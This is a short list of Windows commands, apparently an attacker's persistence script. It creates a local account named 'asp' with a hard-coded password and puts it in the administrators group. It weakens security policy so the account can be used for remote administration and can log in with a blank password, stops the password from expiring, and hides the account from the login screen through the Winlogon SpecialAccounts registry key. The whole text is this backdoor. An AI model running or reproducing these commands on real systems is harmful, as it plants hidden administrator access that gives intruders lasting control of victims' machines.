net.exe user asp Qwerty12! /add
net.exe localgroup administrators asp /add
reg add HKLM\System\CurrentControlSet\Control\Lsa /v forceguest /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
wmic path Win32_UserAccount where Name=\'asp\' set PasswordExpires=false
reg add hklm\system\currentcontrolset\control\lsa /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" /f /reg:64
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /reg:64
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v asp /t REG_DWORD /d 0 /f /reg:64